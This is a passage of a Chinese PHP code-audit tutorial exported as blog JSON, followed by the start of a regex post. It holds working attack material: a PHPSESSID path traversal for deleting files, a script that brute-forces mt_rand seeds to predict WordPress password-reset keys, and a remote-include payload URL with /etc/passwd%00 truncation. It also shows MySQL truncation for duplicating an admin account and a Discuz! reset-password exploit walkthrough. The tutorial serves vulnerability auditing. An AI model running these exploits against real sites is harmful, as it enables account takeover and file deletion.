href=\"#session-destroy-删除文件漏洞\">null</a>session_destroy()删除文件漏洞</h4>\n<p><em>测试PHP版本：5.1.2</em></p>\n<p>这个漏洞是几年前朋友saiy发现的，session_destroy()函数的功能是删除session文件，很多web应用程序的logout的功能都直接调用这个函数删除session，但是这个函数在一些老的版本中缺少过滤导致可以删除任意文件。测试代码如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"><span class=\"comment\">//val.php   </span></span><br><span class=\"line\">session_save_path(<span class=\"string\">'./'</span>);</span><br><span class=\"line\">session_start();</span><br><span class=\"line\"><span class=\"keyword\">if</span>($_GET[<span class=\"string\">'del'</span>]) &#123;</span><br><span class=\"line\">\tsession_unset();</span><br><span class=\"line\">\tsession_destroy();</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t$_SESSION[<span class=\"string\">'hei'</span>]=<span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">echo</span>(session_id());</span><br><span class=\"line\">\tprint_r($_SESSION);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>当我们提交构造cookie:PHPSESSID=/…/1.php，相当于unlink(‘sess<code>_</code>/…/1.php’)这样就通过注射…/转跳目录删除任意文件了。很多著名的程序某些版本都受影响如phpmyadmin，sablog，phpwind3等等。</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\"><strong>漏洞审计策略</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">PHP版本要求：具体不详<br>系统要求：无<br>审计策略：查找session_destroy </td></tr></tbody></table>\n\n\n\n<h4 id=\"随机函数\"><a class=\"header-anchor\" href=\"#随机函数\">null</a>随机函数</h4>\n<p><strong>1) rand() VS mt_rand()</strong></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//on windows</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> mt_getrandmax(); <span class=\"comment\">//2147483647</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> getrandmax();<span class=\"comment\">// 32767</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>可以看出rand()最大的随机数是32767，这个很容易被我们暴力破解。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$a= md5(rand());</span><br><span class=\"line\"><span class=\"keyword\">for</span>($i=<span class=\"number\">0</span>;$i&lt;=<span class=\"number\">32767</span>;$i++)&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(md5($i) ==$a ) &#123;</span><br><span class=\"line\">   <span class=\"keyword\">print</span> $i.<span class=\"string\">\"--&gt;ok!!&lt;br&gt;\"</span>;<span class=\"keyword\">exit</span>;</span><br><span class=\"line\">   &#125;<span class=\"keyword\">else</span> &#123; <span class=\"keyword\">print</span> $i.<span class=\"string\">\"&lt;br&gt;\"</span>;&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>当我们的程序使用rand处理session时，攻击者很容易暴力破解出你的session，但是对于mt_rand是很难单纯的暴力的。</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\"><strong>漏洞审计策略</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">PHP版本要求：无<br>系统要求：无<br>审计策略：查找rand </td></tr></tbody></table>\n\n\n\n<p><strong>2) mt_srand()/srand()-weak seeding（by Stefan Esser）</strong></p>\n<p>看php手册里的描述：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mt_srand</span><br><span class=\"line\">(PHP 3 &gt;= 3.0.6, PHP 4, PHP 5)</span><br><span class=\"line\"></span><br><span class=\"line\">mt_srand -- 播下一个更好的随机数发生器种子</span><br><span class=\"line\">说明</span><br><span class=\"line\">void mt_srand ( int seed )</span><br></pre></td></tr></table></figure>\n<p>用 seed 来给随机数发生器播种。从 PHP 4.2.0 版开始，seed 参数变为可选项，当该项为空时，会被设为随时数。</p>\n<p>例子 1. mt_srand() 范例</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">// seed with microseconds</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">make_seed</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">list</span>($usec, $sec) = explode(<span class=\"string\">' '</span>, microtime());</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (float) $sec + ((float) $usec * <span class=\"number\">100000</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">mt_srand(make_seed());</span><br><span class=\"line\">$randval = mt_rand();</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p><em>注: 自 PHP 4.2.0 起，不再需要用 srand() 或 mt_srand() 函数给随机数发生器播种，现已自动完成。</em></p>\n<p>php从4.2.0开始实现了自动播种，但是为了兼容，后来使用类似于这样的代码播种：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mt_srand ((double) microtime() * 1000000)</span><br></pre></td></tr></table></figure>\n<p>但是使用(double)microtime()<code>*</code>1000000类似的代码seed是比较脆弱的：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0&lt;(double) microtime()&lt;1 ---&gt; 0&lt;(double) microtime()* 1000000&lt;1000000</span><br></pre></td></tr></table></figure>\n<p>那么很容易暴力破解,测试代码如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">/////////////////</span></span><br><span class=\"line\"><span class=\"comment\">//&gt;php rand.php</span></span><br><span class=\"line\"><span class=\"comment\">//828682</span></span><br><span class=\"line\"><span class=\"comment\">//828682</span></span><br><span class=\"line\"><span class=\"comment\">////////////////</span></span><br><span class=\"line\">ini_set(<span class=\"string\">\"max_execution_time\"</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">$time=(double) microtime()* <span class=\"number\">1000000</span>;</span><br><span class=\"line\"><span class=\"keyword\">print</span> $time.<span class=\"string\">\"\\n\"</span>;</span><br><span class=\"line\">mt_srand ($time);</span><br><span class=\"line\"></span><br><span class=\"line\">$search_id = mt_rand();</span><br><span class=\"line\">$seed = search_seed($search_id);</span><br><span class=\"line\"><span class=\"keyword\">print</span> $seed;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">search_seed</span><span class=\"params\">($rand_num)</span> </span>&#123;</span><br><span class=\"line\">$max = <span class=\"number\">1000000</span>;</span><br><span class=\"line\"><span class=\"keyword\">for</span>($seed=<span class=\"number\">0</span>;$seed&lt;=$max;$seed++)&#123;</span><br><span class=\"line\">\tmt_srand($seed);</span><br><span class=\"line\">\t$key = mt_rand();</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>($key==$rand_num) <span class=\"keyword\">return</span> $seed;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>从上面的代码实现了对seed的破解，另外根据Stefan Esser的分析seed还根据进程变化而变化，换句话来说同一个进程里的seed是相同的。 然后同一个seed每次mt_rand的值都是特定的。如下图：</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\"><strong>seed-A</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">mt_rand-A-1<br>mt_rand-A-2<br>mt_rand-A-3 </td></tr></tbody></table>\n\n\n\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\"><strong>seed-B</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">mt_rand-B-1<br>mt_rand-B-2<br>mt_rand-B-3 </td></tr></tbody></table>\n\n\n\n<p>对于seed-A里mt_rand-1/2/3都是不相等的，但是值都是特定的，也就是说当seed-A等于seed-B，那么mt_rand-A-1就等于mt_rand-B-1…，这样我们只要能够得到seed就可以得到每次mt_rand的值了。</p>\n<p>对于5.2.6&gt;php&gt;4.2.0直接使用默认播种的程序也是不安全的（很多的安全人员错误的以为这样就是安全的），这个要分两种情况来分析：</p>\n<p>第一种：‘Cross Application Attacks’，这个思路在Stefan Esser文章里有提到，主要是利用其他程序定义的播种（如mt_srand ((double) microtime()<code>*</code> 1000000)），phpbb+wordpree组合就存在这样的危险.</p>\n<p>第二种：5.2.6&gt;php&gt;4.2.0默认播种的算法也不是很强悍，这是Stefan Esser的文章里的描述：</p>\n<blockquote>\n<p>The Implementation<br>When mt_rand() is seeded internally or by a call to mt_srand() PHP 4 and PHP 5 &lt;= 5.2.0 force the lowest bit to 1. Therefore the strength of the seed is only 31 and not 32 bits. In PHP 5.2.1 and above the implementation of the Mersenne Twister was changed and the forced bit removed.</p>\n</blockquote>\n<p>在32位系统上默认的播种的种子为最大值是<code>2<sup>32&lt;/code&gt;，这样我们循环最多&lt;code&gt;2</sup>32</code>次就可以破解seed。而在PHP 4和PHP 5 &lt;= 5.2.0 的算法有个bug：奇数和偶数的播种是一样的（详见附录<a href=\"3.md\">3</a>）,测试代码如下：<br><br>\n<br></p>\n<pre><code>&lt;?php<br>\nmt_srand(4); <br>\n$a = mt_rand(); <br>\nmt_srand(5); <br>\n$b = mt_rand();<br>\nprint $a.\"\\n\".$b;<br>\n?&gt;<br>\n</code></pre>\n<p>通过上面的代码发现$a==$b，所以我们循环的次数为2<sup>32/2=2</sup>31次。我们看如下代码：<br><br>\n<br></p>\n<pre><code>&lt;?php<br>\n//base on http://www.milw0rm.com/exploits/6421 <br>\n//test on php 5.2.0<br>\n<br>\ndefine('BUGGY', 1); //上面代码$a==$b时候定义BUGGY=1<br>\n<br>\n$key = wp_generate_password(20, false);<br>\necho $key.\"\\n\";<br>\n$seed = getseed($key);<br>\nprint $seed.\"\\n\"; <br>\n<br>\nmt_srand($seed);<br>\n$pass = wp_generate_password(20, false);<br>\necho $pass.\"\\n\";\t<br>\n\t<br>\nfunction wp_generate_password($length = 12, $special_chars = true) {<br>\n\t$chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';<br>\n\tif ( $special_chars )<br>\n\t\t$chars .= '!@#$%^&amp;*()';<br>\n<br>\n\t$password = '';<br>\n\tfor ( $i = 0; $i &lt; $length; $i++ )<br>\n\t\t$password .= substr($chars, mt_rand(0, strlen($chars) - 1), 1);<br>\n\treturn $password;<br>\n} <br>\n<br>\nfunction getseed($resetkey) {<br>\n\t$max = pow(2,(32-BUGGY));<br>\n\tfor($x=0;$x&lt;=$max;$x++) {<br>\n\t\t$seed = BUGGY ? ($x &lt;&lt; 1) + 1 : $x; <br>\n\t\tmt_srand($seed);<br>\n\t\t$testkey = wp_generate_password(20,false);<br>\n\t\tif($testkey==$resetkey) { echo \"o\\n\"; return $seed; }<br>\n<br>\n\t\tif(!($x % 10000)) echo $x / 10000;<br>\n\t}<br>\n\techo \"\\n\";<br>\n\treturn false;<br>\n}<br>\n?&gt;<br>\n</code></pre>\n<p>运行结果如下：<br><br>\n<br></p>\n<pre><code>php5&gt;php rand.php<br>\nM8pzpjwCrvVt3oobAaOr<br>\n0123456789101112131415161718192021222324252627282930313233343536373839404142434<br>\n445464748495051525354555657585960616263646566676869<br>\n7071727374757677787980818283848586878889909192939495969798991001011021031041051<br>\n061071081091101111121131141151161171181191201211221<br>\n2312412512612712812913013113213313413513613713813914014114214314414514614714814<br>\n915015115215315415515615715815916016116216316416516<br>\n6167168169170171172173174175176177178179180181182183184185186187188189190191192<br>\n193194195196197198199200201202203204205206207208209<br>\n2102112122132142152162172182192202212222232242252262272282292302312322332342352<br>\n362372382392402412422432442452462472482492502512522<br>\n..............01062110622106231062410625106261062710628106291063010631106321063<br>\n3o<br>\n70693<br>\npjwCrvVt3oobAaOr<br>\n</code></pre>\n<p>当10634次时候我们得到了结果。<br><br>\n<br><br>\n当PHP版本到了5.2.1后，通过修改算法修补了奇数和偶数的播种相等的问题，这样也导致了php5.2.0前后导致同一个播种后的mt_rand()的值不一样。比如：<br><br>\n<br></p>\n<pre><code>&lt;?php<br>\nmt_srand(42);<br>\necho mt_rand();<br>\n//php&lt;=5.20 1387371436<br>\n//php&gt;5.20 1354439493 \t\t<br>\n?&gt;<br>\n</code></pre>\n<p>正是这个原因，也要求了我们的exp的运行环境：当目标&gt;5.20时候，我们exp运行的环境也要是&gt;5.20的版本，反过来也是一样。<br><br>\n<br><br>\n从上面的测试及分析来看，php&lt;5.26不管有没有定义播种，mt_rand处理的数据都是不安全的。在web应用里很多都使用mt_rand来处理随机的session，比如密码找回功能等等，这样的后果就是被攻击者恶意利用直接修改密码。<br><br>\n<br><br>\n很多著名的程序都产生了类似的漏洞如wordpress、phpbb、punbb等等。（在后面我们将实际分析下国内著名的bbs程序Discuz!的mt_srand导致的漏洞）<br><br>\n<br></p>\n<table><thead><th> <b>漏洞审计策略</b> </th></thead><tbody>\n<tr><td> PHP版本要求：php4 php5<5.2.6<br>系统要求：无<br>审计策略：查找mt_srand/mt_rand </5.2.6<br></td></tr></tbody></table>\n<p></p><h3>特殊字符</h3><p></p>\n<p>其实“特殊字符”也没有特定的标准定义，主要是在一些code hacking发挥着特殊重作用的一类字符。下面就举几个例子：<br><br>\n<br></p>\n<p></p><h4>截断</h4><p></p>\n<p>其中最有名的数大家都熟悉的null字符截断。<br><br>\n<br></p>\n<p></p><h5>include截断</h5><p></p>\n<pre><code>&lt;?php <br>\ninclude $_GET['action'].\".php\"; <br>\n?&gt;<br>\n</code></pre>\n<p>提交“action=/etc/passwd%00”中的“%00”将截断后面的“.php”，但是除了“%00”还有没有其他的字符可以实现截断使用呢？肯定有人想到了远程包含的url里问号“?”的作用，通过提交“action=<code><a href=\"http://www.hacksite.com/evil-code.txt\" target=\"_blank\" rel=\"noopener\">http://www.hacksite.com/evil-code.txt</a></code>?”这里“?”实现了“伪截断”：），好象这个看上去不是那么舒服那么我们简单写个代码fuzz一下：<br><br>\n<br></p>\n<pre><code>&lt;?php<br>\n////////////////////<br>\n////var5.php代码:<br>\n////include $_GET['action'].\".php\"; <br>\n////print strlen(realpath(\"./\"))+strlen($_GET['action']);  <br>\n///////////////////<br>\nini_set('max_execution_time', 0);<br>\n$str='';<br>\nfor($i=0;$i&lt;50000;$i++)<br>\n{<br>\n\t$str=$str.\"/\";<br>\n<br>\n\t$resp=file_get_contents('http://127.0.0.1/var/var5.php?action=1.txt'.$str);<br>\n\t//1.txt里的代码为print 'hi';<br>\n\tif (strpos($resp, 'hi') !== false){<br>\n\t\tprint $i;<br>\n\t\texit;<br>\n\t}<br>\n}<br>\n?&gt;<br>\n</code></pre>\n<p>经过测试字符“.”、“ /”或者2个字符的组合，在一定的长度时将被截断，win系统和<code><em></em></code>nix的系统长度不一样，当win下strlen(realpath(&quot;./&quot;))+strlen($<code>_</code>GET<code>[‘action’]</code>)的长度大于256时被截断，对于<code></code>nix的长度是4 <code>*</code> 1024 = 4096。对于php.ini里设置远程文件关闭的时候就可以利用上面的技巧包含本地文件了。（此漏洞由cloie#ph4nt0m.org最先发现]）<br><br>\n<br></p>\n<p></p><h5>数据截断</h5><p></p>\n<p>对于很多web应用文件在很多功能是不容许重复数据的，比如用户注册功能等。一般的应用程序对于提交注册的username和数据库里已有的username对比是不是已经有重复数据，然而我们可以通过“数据截断”等来饶过这些判断，数据库在处理时候产生截断导致插入重复数据。<br><br>\n<br><br>\n<b>1) Mysql SQL Column Truncation Vulnerabilities</b></p>\n<p>这个漏洞又是大牛Stefan Esser发现的（Stefan Esser是我的偶像:)），这个是由于mysql的sql_mode设置为default的时候，即没有开启STRICT_ALL_TABLES选项时，MySQL对于插入超长的值只会提示warning，而不是error（如果是error就插入不成功），这样可能会导致一些截断问题。测试如下：<br><br>\n<br></p>\n<pre><code>mysql&gt; insert into truncated_test(`username`,`password`) values(\"admin\",\"pass\");<br>\n<br>\nmysql&gt; insert into truncated_test(`username`,`password`) values(\"admin           x\", \"new_pass\");<br>\nQuery OK, 1 row affected, 1 warning (0.01 sec)<br>\n<br>\nmysql&gt; select * from truncated_test;<br>\n+----+------------+----------+<br>\n| id | username   | password |<br>\n+----+------------+----------+<br>\n| 1 | admin      | pass     |<br>\n| 2 | admin      | new_pass |<br>\n+----+------------+----------+<br>\n2 rows in set (0.00 sec)<br>\n</code></pre>\n<p><b>2) Mysql charset Truncation vulnerability</b></p>\n<p>这个漏洞是80sec发现的，当mysql进行数据存储处理utf8等数据时对某些字符导致数据截断。测试如下：<br><br>\n<br></p>\n<pre><code>mysql&gt; insert into truncated_test(`username`,`password`) values(concat(\"admin\",0xc1), \"new_pass2\");<br>\nQuery OK, 1 row affected, 1 warning (0.00 sec)<br>\n<br>\nmysql&gt; select * from truncated_test;<br>\n+----+------------+----------+<br>\n| id | username   | password |<br>\n+----+------------+----------+<br>\n| 1 | admin      | pass      |<br>\n| 2 | admin      | new_pass  |<br>\n| 3 | admin      | new_pass2 |<br>\n+----+------------+----------+<br>\n2 rows in set (0.00 sec)<br>\n</code></pre>\n<p>很多的web应用程序没有考虑到这些问题，只是在数据存储前简单查询数据是否包含相同数据，如下代码：<br><br>\n<br></p>\n<pre><code>$result = mysql_query(\"SELECT * from test_user where user='$user' \");<br>\n  ....<br>\nif(@mysql_fetch_array($result, MYSQL_NUM)) {<br>\n\tdie(\"already exist\");<br>\n}<br>\n</code></pre>\n<table><thead><th> <b>漏洞审计策略</b> </th></thead><tbody>\n<tr><td> PHP版本要求：无<br>系统要求：无<br>审计策略：通读代码 </td></tr></tbody></table>\n<p></p><h5>文件操作里的特殊字符</h5><p></p>\n<p>文件操作里有很多特殊的字符，发挥特别的作用，很多web应用程序没有注意处理这些字符而导致安全问题。比如很多人都知道的windows系统文件名对“空格”和“.”等的忽视，这个主要体现在上传文件或者写文件上，导致直接写webshell。另外对于windows系统对“…\\”进行系统转跳等等。<br><br>\n<br><br>\n下面还给大家介绍一个非常有意思的问题：<br><br>\n<br></p>\n<pre><code>//Is this code vul?<br>\nif( eregi(\".php\",$url) ){<br>\n\tdie(\"ERR\");<br>\n}<br>\n$fileurl=str_replace($webdb[www_url],\"\",$url);<br>\n.....<br>\nheader('Content-Disposition: attachment; filename='.$filename);<br>\n</code></pre>\n<p>很多人看出来了上面的代码的问题，程序首先禁止使用“.php”后缀。但是下面居然接了个str_replace替换$webdb<a href=\"www_url.md\">www_url</a>为空，那么我们提交“.p$webdb<a href=\"www_url.md\">www_url</a>hp”就可以饶过了。那么上面的代码杂fix呢？有人给出了如下代码：<br><br>\n<br></p>\n<pre><code>$fileurl=str_replace($webdb[www_url],\"\",$url);<br>\nif( eregi(\".php\",$url) ){<br>\n\tdie(\"ERR\");<br>\n}<br>\n</code></pre>\n<p>str_replace提到前面了，很完美的解决了str_replace代码的安全问题，但是问题不是那么简单，上面的代码在某些系统上一样可以突破。接下来我们先看看下面的代码：<br><br>\n<br></p>\n<pre><code>&lt;?php<br>\nfor($i=0;$i&lt;255;$i++) {<br>\n\t$url = '1.ph'.chr($i);<br>\n\t$tmp = @file_get_contents($url);<br>\n\tif(!empty($tmp)) echo chr($i).\"\\r\\n\";<br>\n}  <br>\n?&gt;<br>\n</code></pre>\n<p>我们在windows系统运行上面的代码得到如下字符<code>*</code> &lt; &gt; ? P p都可以打开目录下的1.php。<br><br>\n<br></p>\n<table><thead><th> <b>漏洞审计策略</b> </th></thead><tbody>\n<tr><td> PHP版本要求：无<br>系统要求：无<br>审计策略：文读取件操作函数 </td></tr></tbody></table>\n<p></p><h2>怎么进一步寻找新的字典</h2><p></p>\n<p>上面我们列举很多的字典，但是很多都是已经公开过的漏洞或者方式，那么我们怎么进一步找到新的字典或者利用方式呢？<br><br>\n<br></p>\n<ul><li>分析和学习别人发现的漏洞或者exp，总结出漏洞类型及字典<br>\n</li><li>通过学习php手册或者官方文档,挖掘出新的有危害的函数或者利用方式<br>\n</li><li>fuzz php的函数，找到新的有问题的函数（不一定非要溢出的），如上一章的4.6的部分很多都可以简单的fuzz脚本可以测试出来<br>\n</li><li>分析php源代码，发现新的漏洞函数“特性”或者漏洞。（在上一节里介绍的那些“漏洞审计策略”里，都没有php源代码的分析，如果你要进一步找到新的字典，可以在php源代码的基础上分析下成因，然后根据这个成因来分析寻找新的漏洞函数“特性”或者漏洞。）（我们以后会陆续公布一些我们对php源代码的分析）<br>\n</li><li>有条件或者机会和开发者学习，找到他们实现某些常用功能的代码的缺陷或者容易忽视的问题<br>\n</li><li>你有什么要补充的吗？ ：）</li></ul>\n<p></p><h2>DEMO</h2><p></p>\n<table><thead><th> <b>DEMO -- Discuz! Reset User Password 0day Vulnerability 分析</b><br>（Exp:<a href=\"http://www.80vul.com/dzvul/sodb/14/sodb-2008-14.txt\" target=\"_blank\" rel=\"noopener\">http://www.80vul.com/dzvul/sodb/14/sodb-2008-14.txt</a>）</th></thead><tbody>\n<tr><td> PHP版本要求:php4 php5<5.2.6<br>系统要求: 无<br>审计策略:查找mt_srand/mt_rand </5.2.6<br></td></tr></tbody></table>\n<p>第一步 安装Discuz! 6.1后利用grep查找mt_srand得到：<br><br>\n<br></p>\n<pre><code>heige@heige-desktop:~/dz6/upload$ grep -in 'mt_srand' -r ./ --colour -5<br>\n./include/global.func.php-694-  $GLOBALS['rewritecompatible'] &amp;&amp; $name = rawurlencode($name);<br>\n./include/global.func.php-695-  return '&lt;a href=\"tag-'.$name.'.html\"'.stripslashes($extra).'&gt;';<br>\n./include/global.func.php-696-}<br>\n./include/global.func.php-697-<br>\n./include/global.func.php-698-function random($length, $numeric = 0) {<br>\n./include/global.func.php:699:  PHP_VERSION &lt; '4.2.0' &amp;&amp; mt_srand((double)microtime() * 1000000);<br>\n./include/global.func.php-700-  if($numeric) {<br>\n./include/global.func.php-701-          $hash = sprintf('%0'.$length.'d', mt_rand(0, pow(10, $length) - 1));<br>\n./include/global.func.php-702-  } else {<br>\n./include/global.func.php-703-          $hash = '';<br>\n./include/global.func.php-704-          $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz';<br>\n--<br>\n./include/discuzcode.func.php-30-<br>\n./include/discuzcode.func.php-31-if(!isset($_DCACHE['bbcodes']) || !is_array($_DCACHE['bbcodes']) || !is_array($_DCACHE['smilies'])) {<br>\n./include/discuzcode.func.php-32-       @include DISCUZ_ROOT.'./forumdata/cache/cache_bbcodes.php';<br>\n./include/discuzcode.func.php-33-}<br>\n./include/discuzcode.func.php-34-<br>\n./include/discuzcode.func.php:35:mt_srand((double)microtime() * 1000000);<br>\n./include/discuzcode.func.php-36-<br>\n./include/discuzcode.func.php-37-function attachtag($pid, $aid, &amp;$postlist) {<br>\n./include/discuzcode.func.php-38-       global $attachrefcheck, $thumbstatus, $extcredits, $creditstrans, $ftp, $exthtml;<br>\n./include/discuzcode.func.php-39-       $attach = $postlist[$pid]['attachments'][$aid];<br>\n./include/discuzcode.func.php-40-       if($attach['attachimg']) {<br>\n</code></pre>\n<p>有两个文件用到了mt_srand()，第1是在./include/global.func.php的随机函数random()里：<br><br>\n<br></p>\n<pre><code> PHP_VERSION &lt; '4.2.0' &amp;&amp; mt_srand((double)microtime() * 1000000);<br>\n</code></pre>\n<p>判断了版本，如果是PHP_VERSION &gt; '4.2.0’使用php本身默认的播种。从上一章里的分析我们可以看得出来，使用php本身默认的播种的分程序两种情况：<br><br>\n<br></p>\n<ol>\n<li>‘Cross Application Attacks’ 这个思路是只要目标上有使用使用的程序里定义了类似mt_srand((double)microtime() <code>*</code> 1000000)的播种的话，又很有可能被暴力。在dz这里不需要Cross Application，因为他本身有文件就定义了，就是上面的第2个文件：<br><br>\n<br></li>\n</ol>\n<pre><code>./include/discuzcode.func.php:35:mt_srand((double)microtime() * 1000000);<br>\n</code></pre>\n<p>这里我们肯定dz是存在这个漏洞的，文章给出来的exp也就是基于这个的。（具体exp利用的流程有兴趣的可以自己分析下]）<br><br>\n<br></p>\n<ol start=\"2\">\n<li>有的人认为如果没有mt_srand((double)microtime() <code>*</code> 1000000);这里的定义，那么dz就不存在漏洞，这个是不正确的。首先你不可以保证别人使用的其他应用程序没有定义，再次不利用’Cross Application Attacks’，5.2.6&gt;php&gt;4.2.0 php本身默认播种的算法也不是很强悍（分析详见上），也是有可以暴力出来，只是速度要慢一点。<br><br>\n<br><br>\n<br></li>\n</ol>\n<p></p><h2>后话</h2><p></p>\n<p>本文是80vul的三大马甲：80vul-A，80vul-B，80vul-C集体智慧的结晶，尤其是80vul-B贡献了不少新发现。另外需要感谢的是文章里提到的那些漏洞的发现者，没有他们的成果也就没有本文。本文没有写“参考”，因为本文是一个总结性的文挡，有太多的连接需要提供限于篇幅就没有一一列举，有心的读者可以自行google。另外原本没有打算公布此文，因为里面包含了太多应用程序的0day，而且有太多的不尊重别人成果的人，老是利用从别人那学到的技术来炫耀，甚至牟取利益。在这里我们希望你可以在本文里学到些东西，更加希望如果通过本文你找到了某些应用程序的0day，请低调处理，或者直接提交给官方修补，谢谢大家！！<br><br>\n<br><br>\n<br></p>\n<p></p><h2>附录</h2><p></p>\n<p><code>[</code>1<code>]</code> <a href=\"http://bbs.phpchina.com/attachment.php?aid=22294\" target=\"_blank\" rel=\"noopener\">http://bbs.phpchina.com/attachment.php?aid=22294</a><br><code>[</code>2<code>]</code> <a href=\"http://www.php-security.org/\" target=\"_blank\" rel=\"noopener\">http://www.php-security.org/</a><br><code>[</code>3<code>]</code> <a href=\"http://bugs.php.net/bug.php?id=40114\" target=\"_blank\" rel=\"noopener\">http://bugs.php.net/bug.php?id=40114</a></p>\n","categories":["web入门"],"tags":["php代码审计"]},{"title":"浅识正则表达式","url":"https://13m0nade.github.io/2019/07/30/浅识正则表达式/","content":"<h1>元字符</h1>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">代码/语法</th>\n<th style=\"text-align:center\">说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">.</td>\n<td style=\"text-align:center\">匹配除换行符以外的任意字符</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">\\w</td>\n<td style=\"text-align:center\">匹配字母或数字或下划线或汉字</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">\\s</td>\n<td style=\"text-align:center\">匹配任意的空白符</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">\\d</td>\n<td style=\"text-align:center\">匹配数字</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">\\b</td>\n<td style=\"text-align:center\">匹配单词的开始或结束</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">^</td>\n<td style=\"text-align:center\">匹配字符串的开始</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">$</td>\n<td style=\"text-align:center\">匹配字符串的结束</td>\n</tr>\n</tbody>\n</table>\n<p>示例：\\ba\\w*\\b  